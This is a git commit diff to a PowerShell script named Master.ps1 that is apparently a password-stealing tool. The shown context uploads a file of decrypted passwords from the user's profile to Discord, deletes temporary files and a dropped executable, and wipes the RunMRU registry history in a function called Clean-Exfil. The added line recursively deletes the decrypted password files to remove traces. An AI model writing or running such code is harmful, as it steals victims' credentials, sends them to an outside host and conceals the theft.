c97e6b139c2c7c0a693683b5435abbd5756e6cc1
skekic16 <151707511+skekic16@users.noreply.github.com>
2023-12-27 14:56:16 -0600

    Update Master.ps1

--- Master.ps1
+++ Master.ps1
@@ -44,6 +44,7 @@ Upload-Discord -file $env:USERPROFILE\decrypted_password.csv
 
 rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
 rm "$env:USERPROFILE\bORG2.exe"
+get-childItem * -Include *decrypted_password.csv -Recurse | rm
 function Clean-Exfil { 
 
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
